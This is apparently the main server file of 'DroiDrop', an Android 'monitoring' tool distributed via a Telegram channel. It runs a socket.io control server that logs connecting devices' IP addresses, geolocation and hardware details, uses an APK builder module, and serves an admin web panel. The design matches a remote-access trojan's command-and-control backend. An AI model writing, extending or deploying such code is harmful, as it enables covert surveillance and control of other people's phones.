/* 
*   DroiDrop
*   An Android Monitoring Tools
*   By t.me/efxtv
*/


const
    express = require('express'),
    app = express(),
    IO = require('socket.io'),
    geoip = require('geoip-lite'),
    CONST = require('./includes/const'),
    db = require('./includes/databaseGateway'),
    logManager = require('./includes/logManager'),
    clientManager = new (require('./includes/clientManager'))(db),
    apkBuilder = require('./includes/apkBuilder');

global.CONST = CONST;
global.db = db;
global.logManager = logManager;
global.app = app;
global.clientManager = clientManager;
global.apkBuilder = apkBuilder;

// spin up socket server
let client_io = IO(CONST.control_port, {
    pingInterval: 30000,
    maxHttpBufferSize: 1e8,
    allowEIO3: true,
    cors: {
        origin: "*"
    }
});

client_io.on('error', (err) => {
    logManager.log(CONST.logTypes.error, "Socket Server Error: " + err);
});

client_io.on('connection', (socket) => {
    socket.emit('welcome');
    let clientParams = socket.handshake.query;
    let clientIP = socket.handshake.address.split(':').pop();
    let clientGeo = geoip.lookup(clientIP);
    if (!clientGeo) clientGeo = {}

    clientManager.clientConnect(socket, clientParams.id, {
        clientIP,
        clientGeo,
        device: {
            model: clientParams.model,
            manufacture: clientParams.manf,
            version: clientParams.release
        }
    });

    if (CONST.debug) {
        socket.onAny((event, data) => {
            console.log(event);
            console.log(data);
        });
    }

});


// get the admin interface online
app.listen(CONST.web_port);

/* 
*   
*   
*   t.me/efxtv
*/

app.set('view engine', 'ejs');
app.set('views', './assets/views');
app.use(express.static(__dirname + '/assets/webpublic'));
app.use(require('./includes/expressRoutes'));
